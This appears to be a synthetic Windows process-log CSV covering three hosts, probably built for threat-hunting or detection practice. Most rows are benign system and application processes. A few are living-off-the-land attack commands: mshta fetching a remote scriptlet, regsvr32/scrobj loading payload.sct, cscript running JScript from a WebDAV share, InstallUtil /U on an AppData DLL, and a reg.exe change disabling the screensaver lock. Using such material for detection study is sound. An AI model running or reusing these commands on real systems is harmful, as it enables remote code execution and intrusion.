arguments,hostname,name,path,pid,username
C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted,NS0000HXE,svchost.exe,C:\Windows\system32,4084,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalService,NS0000HXE,svchost.exe,C:\Windows\system32,2584,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k utcsvc,NS0000HXE,svchost.exe,C:\Windows\System32,80,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,NS0000HXE,svchost.exe,C:\Windows\system32,1844,NT AUTHORITY\SYSTEM
"""C:\Users\hol.long\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=12376823585177401963 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=12376823585177401963 --renderer-client-id=7 --mojo-platform-channel-handle=2368 /prefetch:1",NS0000HXE,opera.exe,C:\Users\hol.long\AppData\Local\Programs\Opera\56.0.3051.52,5860,hol.long
"""C:\Program Files\internet explorer\iexplore.exe"" ",NS0000HXE,iexplore.exe,C:\Program Files\internet explorer,5521,hol.long
"""dwm.exe""",NS0000HXE,dwm.exe,C:\Windows\system32,3672,NT AUTHORITY\SYSTEM
C:\Windows\System32\spoolsv.exe,NS0000HXE,spoolsv.exe,C:\Windows\System32,6436,NT AUTHORITY\SYSTEM
C:\Windows\system32\wbem\wmiprvse.exe,NS0000HXE,wmiprvse.exe,C:\Windows\system32\wbem,1164,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer.exe"" ",NS0000HXE,TeamViewer.exe,C:\Program Files (x86)\TeamViewer,4635,ola.cam78
"""C:\Users\hol.long\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --start-maximized --ran-launcher",NS0000HXE,opera.exe,C:\Users\hol.long\AppData\Local\Programs\Opera\56.0.3051.52,3812,hol.long
"""C:\Users\hol.long\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=6930244878569528683 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=6930244878569528683 --renderer-client-id=3 --mojo-platform-channel-handle=2904 /prefetch:1",NS0000HXE,opera.exe,C:\Users\hol.long\AppData\Local\Programs\Opera\56.0.3051.52,3274,hol.long
winlogon.exe,NS0000HXE,winlogon.exe,C:\Windows\system32,3276,NT AUTHORITY\SYSTEM
C:\Windows\System32\msdtc.exe,NS0000HXE,msdtc.exe,C:\Windows\System32,3664,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,NS0000HXE,svchost.exe,C:\Windows\System32,340,NT AUTHORITY\SYSTEM
"""C:\Program Files\AVAST Software\Avast\AvastUI.exe"" /welcome",NS0000HXE,AvastUI.exe,C:\Program Files\AVAST Software\Avast,2658,caroly.park
C:\Windows\system32\svchost.exe -k netsvcs,NS0000HXE,svchost.exe,C:\Windows\system32,1308,NT AUTHORITY\SYSTEM
taskhostex.exe ,NS0000HXE,taskhostex.exe,C:\Windows\system32,4824,NT AUTHORITY\SYSTEM
wininit.exe,NS0000HXE,wininit.exe,C:\Windows\system32,552,NT AUTHORITY\SYSTEM
"""C:\Users\hol.long\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=2685998191293934672 --lang=en-GB --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=2685998191293934672 --renderer-client-id=12 --mojo-platform-channel-handle=4360 /prefetch:1",NS0000HXE,opera.exe,C:\Users\hol.long\AppData\Local\Programs\Opera\56.0.3051.52,421,hol.long
C:\Windows\system32\svchost.exe -k NetworkService,NS0000HXE,svchost.exe,C:\Windows\system32,244,NT AUTHORITY\SYSTEM
C:\Windows\system32\lsass.exe,NS0000HXE,lsass.exe,C:\Windows\system32,384,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""",NS0000HXE,TeamViewer_Service.exe,C:\Program Files (x86)\TeamViewer,5744,ola.cam78
"""C:\Users\hol.long\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=16451249972883912486 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=16451249972883912486 --renderer-client-id=4 --mojo-platform-channel-handle=3140 /prefetch:1",NS0000HXE,opera.exe,C:\Users\hol.long\AppData\Local\Programs\Opera\56.0.3051.52,1967,hol.long
"""dwm.exe""",NS0000HXE,dwm.exe,C:\Windows\system32,5440,NT AUTHORITY\SYSTEM
"""LogonUI.exe"" /flags:0x0",NS0000HXE,LogonUI.exe,C:\Windows\system32,420,NT AUTHORITY\SYSTEM
"""C:\Windows\system32\mspaint.exe"" ",NS0000HXE,mspaint.exe,C:\Windows\system32,5011,caroly.park
"C:\Users\hol.long\AppData\Local\Programs\Opera\56.0.3051.52\opera_crashreporter.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\hol.long\AppData\Roaming\Opera Software\Opera Stable\Crash Reports"" ""--crash-count-file=C:\Users\hol.long\AppData\Roaming\Opera Software\Opera Stable\crash_count.txt"" --url=https://crashstats-collector.opera.com/collector/submit --annotation=channel=Stable --annotation=plat=Win64 --annotation=prod=OperaDesktop --annotation=ver=56.0.3051.52 --initial-client-data=0x238 0x304 0x30c 0x320 0x308 0x7ffb51313108 0x7ffb51313118 0x7ffb51313128",NS0000HXE,opera_crashreporter.exe,C:\Users\hol.long\AppData\Local\Programs\Opera\56.0.3051.52,1726,hol.long
"""C:\Program Files (x86)\Common Files\VMware\USB\vmware-usbarbitrator64.exe""",NS0000HXE,vmware-usbarbitrator64.exe,C:\Program Files (x86)\Common Files\VMware\USB,3239,ola.cam78
"""C:\Program Files (x86)\TeamViewer\tv_w32.exe"" --action hooks  --log C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log  ",NS0000HXE,tv_w32.exe,C:\Program Files (x86)\TeamViewer,4171,ola.cam78
C:\Windows\system32\svchost.exe -k RPCSS,NS0000HXE,svchost.exe,C:\Windows\system32,488,NT AUTHORITY\SYSTEM
C:\Windows\Explorer.EXE,NS0000HXE,Explorer.EXE,C:\Windows,4004,NT AUTHORITY\SYSTEM
/logfile= /LogToConsole=false /U C:\Users\caroly.park\AppData\Local\Microsoft\WindowsApps\bin.dll,NS0000HXE,InstallUtil,C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe,2104,NT AUTHORITY\SYSTEM
"C:\Windows\System32\mshta vbscript:Close(Execute(""GetObject(""""script:http://www.Ш3.me/schedtsk.sct"""")""))",NS0000HXE,mshta.exe,C:\Windows\System32\mshta.exe,5944,hol.long
C:\Windows\System32\svchost.exe -k LocalServicePeerNet,NT0002LNO,svchost.exe,C:\Windows\System32,2116,NT AUTHORITY\SYSTEM
C:\Windows\Explorer.EXE,NT0002LNO,Explorer.EXE,C:\Windows,1364,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe"" ",NT0002LNO,AcroRd32.exe,C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader,3897,a.canderson
winlogon.exe,NT0002LNO,winlogon.exe,C:\Windows\system32,6056,NT AUTHORITY\SYSTEM
"""C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --start-maximized --ran-launcher",NT0002LNO,opera.exe,C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52,1653,a.canderson
C:\Windows\servicing\TrustedInstaller.exe,NT0002LNO,TrustedInstaller.exe,C:\Windows\servicing,552,NT AUTHORITY\SYSTEM
C:\Windows\System32\spoolsv.exe,NT0002LNO,spoolsv.exe,C:\Windows\System32,2136,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe"" --backgroundcolor=16514043",NT0002LNO,RdrCEF.exe,C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF,4086,a.canderson
C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,NT0002LNO,svchost.exe,C:\Windows\system32,2380,NT AUTHORITY\SYSTEM
\SystemRoot\System32\smss.exe,NT0002LNO,smss.exe,\SystemRoot\System32,5248,NT AUTHORITY\SYSTEM
C:\Windows\system32\lsm.exe,NT0002LNO,lsm.exe,C:\Windows\system32,5460,NT AUTHORITY\SYSTEM
"""C:\Program Files\Windows Media Player\wmpnetwk.exe""",NT0002LNO,wmpnetwk.exe,C:\Program Files\Windows Media Player,5272,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""",NT0002LNO,TeamViewer_Service.exe,C:\Program Files (x86)\TeamViewer,3510,a.canderson
C:\Windows\System32\svchost.exe -k secsvcs,NT0002LNO,svchost.exe,C:\Windows\System32,1228,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ""-env:OOO_CWD=2C:\\Program Files (x86)\\OpenOffice 4""",NT0002LNO,soffice.bin,C:\Program Files (x86)\OpenOffice 4\program,1395,samueldia
C:\Windows\system32\svchost.exe -k DcomLaunch,NT0002LNO,svchost.exe,C:\Windows\system32,3092,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,NT0002LNO,svchost.exe,C:\Windows\System32,6224,NT AUTHORITY\SYSTEM
"""C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=16451249972883912486 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=16451249972883912486 --renderer-client-id=4 --mojo-platform-channel-handle=3140 /prefetch:1",NT0002LNO,opera.exe,C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52,2149,a.canderson
wininit.exe,NT0002LNO,wininit.exe,C:\Windows\system32,3720,NT AUTHORITY\SYSTEM
,NT0002LNO,DisplaySwitch.exe,C:\Windows\System32\DisplaySwitch.exe,3136,NT AUTHORITY\SYSTEM
"""C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=2685998191293934672 --lang=en-GB --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=2685998191293934672 --renderer-client-id=12 --mojo-platform-channel-handle=4360 /prefetch:1",NT0002LNO,opera.exe,C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52,3032,a.canderson
C:\Windows\system32\svchost.exe -k netsvcs,NT0002LNO,svchost.exe,C:\Windows\system32,848,NT AUTHORITY\SYSTEM
C:\Windows\System32\VBoxService.exe,NT0002LNO,VBoxService.exe,C:\Windows\System32,676,NT AUTHORITY\SYSTEM
"""C:\Users\a.canderson\AppData\Local\GitHubDesktop\app-1.4.3\GitHubDesktop.exe"" --squirrel-firstrun",NT0002LNO,GitHubDesktop.exe,C:\Users\a.canderson\AppData\Local\GitHubDesktop\app-1.4.3,4688,a.canderson
C:\Windows\system32\svchost.exe -k RPCSS,NT0002LNO,svchost.exe,C:\Windows\system32,5224,NT AUTHORITY\SYSTEM
C:\Windows\System32\cscript //E:jscript \webdavserver\folder\wdfmg.txt,NT0002LNO,cscript.exe,C:\Windows\System32\cscript.exe,580,NT AUTHORITY\SYSTEM
"""C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=gpu-process --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --gpu-preferences=KAAAAAAAAACAAwBAAQAAAAAAAAAAAGAAAAAAAAAAAAAIAAAAAAAAACgAAAAEAAAAIAAAAAAAAAAoAAAAAAAAADAAAAAAAAAAOAAAAAAAAAAQAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAACwAAABAAAAAAAAAAAQAAAAoAAAAQAAAAAAAAAAEAAAALAAAA --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --service-request-channel-token=7207758415534163028 --mojo-platform-channel-handle=1472 --ignored="" --type=renderer "" /prefetch:2",NT0002LNO,opera.exe,C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52,5466,a.canderson
C:\Windows\system32\svchost.exe -k NetworkService,NT0002LNO,svchost.exe,C:\Windows\system32,1412,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,NT0002LNO,svchost.exe,C:\Windows\System32,5592,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer.exe"" ",NT0002LNO,TeamViewer.exe,C:\Program Files (x86)\TeamViewer,5349,a.canderson
"""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe15_ Global\UsGthrCtrlFltPipeMssGthrPipe15 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",NT0002LNO,SearchProtocolHost.exe,C:\Windows\system32,4888,NT AUTHORITY\SYSTEM
,NT0002LNO,AvastSvc.exe,,4487,a.canderson
"""C:\Program Files\internet explorer\iexplore.exe"" ",NT0002LNO,iexplore.exe,C:\Program Files\internet explorer,6151,victoria.bell
C:\Windows\System32\regsvr32 /u /n /s /i:\webdavserver\folder\payload.sct scrobj.dll,NT0002LNO,wscript.exe,C:\Windows\System32\wscript.exe,760,lzidLQyzlsYnj
"""C:\Windows\system32\Dwm.exe""",NT0002LNO,Dwm.exe,C:\Windows\system32,280,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe""",NT0002LNO,armsvc.exe,C:\Program Files (x86)\Common Files\Adobe\ARM\1.0,1759,a.canderson
"""C:\Users\a.canderson\AppData\Local\GitHubDesktop\app-1.4.3\GitHubDesktop.exe"" --type=gpu-process --no-sandbox --supports-dual-gpus=false --gpu-driver-bug-workarounds=9 12 13 23 27 29 49 70 84 --disable-gl-extensions=""GL_KHR_blend_equation_advanced GL_KHR_blend_equation_advanced_coherent"" --gpu-vendor-id=0x8086 --gpu-device-id=0x0a16 --gpu-driver-vendor=""Intel Corporation"" --gpu-driver-version=20.19.15.4331 --gpu-driver-date=11-18-2015 --service-request-channel-token=29571E74A71F5219E432184D13D76C95 --mojo-platform-channel-handle=1732 /prefetch:2",NT0002LNO,GitHubDesktop.exe,C:\Users\a.canderson\AppData\Local\GitHubDesktop\app-1.4.3,2501,a.canderson
C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,NT0002LNO,svchost.exe,C:\Windows\system32,3408,NT AUTHORITY\SYSTEM
"""taskhost.exe""",NT0002LNO,taskhost.exe,C:\Windows\system32,3576,NT AUTHORITY\SYSTEM
C:\Windows\system32\lsass.exe,NT0002LNO,lsass.exe,C:\Windows\system32,2604,NT AUTHORITY\SYSTEM
"""C:\Program Files\AVAST Software\Avast\AvastUI.exe"" /welcome",NT0002LNO,AvastUI.exe,C:\Program Files\AVAST Software\Avast,5796,a.canderson
"""C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=12376823585177401963 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=12376823585177401963 --renderer-client-id=7 --mojo-platform-channel-handle=2368 /prefetch:1",NT0002LNO,opera.exe,C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52,3525,a.canderson
"""C:\Users\a.canderson\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",NT0002LNO,OneDrive.exe,C:\Users\a.canderson\AppData\Local\Microsoft\OneDrive,3283,a.canderson
"""C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe"" --type=renderer /prefetch:1",NT0002LNO,AcroRd32.exe,C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader,812,a.canderson
"C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52\opera_crashreporter.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\a.canderson\AppData\Roaming\Opera Software\Opera Stable\Crash Reports"" ""--crash-count-file=C:\Users\a.canderson\AppData\Roaming\Opera Software\Opera Stable\crash_count.txt"" --url=https://crashstats-collector.opera.com/collector/submit --annotation=channel=Stable --annotation=plat=Win64 --annotation=prod=OperaDesktop --annotation=ver=56.0.3051.52 --initial-client-data=0x238 0x304 0x30c 0x320 0x308 0x7ffb51313108 0x7ffb51313118 0x7ffb51313128",NT0002LNO,opera_crashreporter.exe,C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52,213,a.canderson
"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ",NT0002LNO,soffice.exe,C:\Program Files (x86)\OpenOffice 4\program,3666,samueldia
C:\Windows\system32\SearchIndexer.exe /Embedding,NT0002LNO,SearchIndexer.exe,C:\Windows\system32,1508,NT AUTHORITY\SYSTEM
\??\C:\Windows\system32\conhost.exe,NT0002LNO,conhost.exe,C:\Windows\system32,3360,NT AUTHORITY\SYSTEM
C:\Windows\system32\sppsvc.exe,NT0002LNO,sppsvc.exe,C:\Windows\system32,188,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalService,NT0002LNO,svchost.exe,C:\Windows\system32,5772,NT AUTHORITY\SYSTEM
"""C:\Windows\system32\wuauclt.exe""",NT0002LNO,wuauclt.exe,C:\Windows\system32,2660,NT AUTHORITY\SYSTEM
"""C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=6930244878569528683 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=6930244878569528683 --renderer-client-id=3 --mojo-platform-channel-handle=2904 /prefetch:1",NT0002LNO,opera.exe,C:\Users\a.canderson\AppData\Local\Programs\Opera\56.0.3051.52,491,a.canderson
"""C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe"" --type=renderer --disable-browser-side-navigation --disable-gpu-compositing --service-pipe-token=49849BA2F50EBF33EAD978C1E9CA6D55 --lang=en-US --disable-pack-loading --lang=en-US --log-file=""C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log"" --log-severity=disable --product-version=""ReaderServices/19.8.20071 Chrome/64.0.3282.119"" --enable-pinch --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --enable-gpu-async-worker-context --content-image-texture-target=0 0 3553;0 1 3553;0 2 3553;0 3 3553;0 4 3553;0 5 3553;0 6 3553;0 7 3553;0 8 3553;0 9 3553;0 10 3553;0 11 3553;0 12 3553;0 13 3553;0 14 3553;0 15 3553;0 16 3553;0 17 3553;0 18 3553;1 0 3553;1 1 3553;1 2 3553;1 3 3553;1 4 3553;1 5 3553;1 6 3553;1 7 3553;1 8 3553;1 9 3553;1 10 3553;1 11 3553;1 12 3553;1 13 3553;1 14 3553;1 15 3553;1 16 3553;1 17 3553;1 18 3553;2 0 3553;2 1 3553;2 2 3553;2 3 3553;2 4 3553;2 5 3553;2 6 3553;2 7 3553;2 8 3553;2 9 3553;2 10 3553;2 11 3553;2 12 3553;2 13 3553;2 14 3553;2 15 3553;2 16 3553;2 17 3553;2 18 3553;3 0 3553;3 1 3553;3 2 3553;3 3 3553;3 4 3553;3 5 3553;3 6 3553;3 7 3553;3 8 3553;3 9 3553;3 10 3553;3 11 3553;3 12 3553;3 13 3553;3 14 3553;3 15 3553;3 16 3553;3 17 3553;3 18 3553;4 0 3553;4 1 3553;4 2 3553;4 3 3553;4 4 3553;4 5 3553;4 6 3553;4 7 3553;4 8 3553;4 9 3553;4 10 3553;4 11 3553;4 12 3553;4 13 3553;4 14 3553;4 15 3553;4 16 3553;4 17 3553;4 18 3553;5 0 3553;5 1 3553;5 2 3553;5 3 3553;5 4 3553;5 5 3553;5 6 3553;5 7 3553;5 8 3553;5 9 3553;5 10 3553;5 11 3553;5 12 3553;5 13 3553;5 14 3553;5 15 3553;5 16 3553;5 17 3553;5 18 3553;6 0 3553;6 1 3553;6 2 3553;6 3 3553;6 4 3553;6 5 3553;6 6 3553;6 7 3553;6 8 3553;6 9 3553;6 10 3553;6 11 3553;6 12 3553;6 13 3553;6 14 3553;6 15 3553;6 16 3553;6 17 3553;6 18 3553 --disable-accelerated-video-decode --service-request-channel-token=49849BA2F50EBF33EAD978C1E9CA6D55 --renderer-client-id=4 --mojo-platform-channel-handle=2328 --allow-no-sandbox-job /prefetch:1",NT0002LNO,RdrCEF.exe,C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF,1767,a.canderson
%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024 20480 768 Windows=On SubSystemType=Windows ServerDll=basesrv 1 ServerDll=winsrv:UserServerDllInitialization 3 ServerDll=winsrv:ConServerDllInitialization 2 ServerDll=sxssrv 4 ProfileControl=Off MaxRequestThreads=16,NT0002LNO,csrss.exe,C:\Windows\system32,2752,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\tv_w32.exe"" --action hooks  --log C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log  ",NT0002LNO,tv_w32.exe,C:\Program Files (x86)\TeamViewer,2971,a.canderson
C:\Windows\system32\services.exe,NT0002LNO,services.exe,C:\Windows\system32,3188,NT AUTHORITY\SYSTEM
C:\Windows\System32\sbdinst.exe C:\Program Files\Common Files\Services\wow64.sbd,NT0002LNO,sbdinst.exe,C:\Windows\System32\sbdinst.exe,960,NT AUTHORITY\SYSTEM
"""C:\Program Files\internet explorer\iexplore.exe"" ",SB0001FSX,iexplore.exe,C:\Program Files\internet explorer,1502,ann.mar3
"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ""-env:OOO_CWD=2C:\\Program Files (x86)\\OpenOffice 4""",SB0001FSX,soffice.bin,C:\Program Files (x86)\OpenOffice 4\program,4325,annab.marti
"""C:\Ruby24-x64\bin\ruby.exe"" ",SB0001FSX,ruby.exe,C:\Ruby24-x64\bin,4274,annab.marti
wininit.exe,SB0001FSX,wininit.exe,C:\Windows\system32,1632,NT AUTHORITY\SYSTEM
"""C:\Windows\system32\Dwm.exe""",SB0001FSX,Dwm.exe,C:\Windows\system32,1488,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ""-env:OOO_CWD=2C:\\Program Files (x86)\\OpenOffice 4""",SB0001FSX,soffice.bin,C:\Program Files (x86)\OpenOffice 4\program,3420,pheo.cam
winlogon.exe,SB0001FSX,winlogon.exe,C:\Windows\system32,4152,NT AUTHORITY\SYSTEM
C:\Windows\Explorer.EXE,SB0001FSX,Explorer.EXE,C:\Windows,2956,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k netsvcs,SB0001FSX,svchost.exe,C:\Windows\system32,3952,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""",SB0001FSX,TeamViewer_Service.exe,C:\Program Files (x86)\TeamViewer,2601,pheo.cam
"""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe15_ Global\UsGthrCtrlFltPipeMssGthrPipe15 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",SB0001FSX,SearchProtocolHost.exe,C:\Windows\system32,6048,NT AUTHORITY\SYSTEM
"C:\Windows\System32\reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f",SB0001FSX,reg.exe,C:\Windows\System32\reg.exe,2460,loghernand
"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ",SB0001FSX,soffice.exe,C:\Program Files (x86)\OpenOffice 4\program,5368,pheo.cam
C:\Windows\system32\sppsvc.exe,SB0001FSX,sppsvc.exe,C:\Windows\system32,992,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,SB0001FSX,svchost.exe,C:\Windows\system32,1484,NT AUTHORITY\SYSTEM
C:\Windows\system32\lsass.exe,SB0001FSX,lsass.exe,C:\Windows\system32,1300,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,SB0001FSX,svchost.exe,C:\Windows\System32,4048,NT AUTHORITY\SYSTEM
,SB0001FSX,AvastSvc.exe,,1159,jose.colema
C:\Windows\system32\svchost.exe -k DcomLaunch,SB0001FSX,svchost.exe,C:\Windows\system32,2576,NT AUTHORITY\SYSTEM
C:\Windows\system32\services.exe,SB0001FSX,services.exe,C:\Windows\system32,4608,NT AUTHORITY\SYSTEM
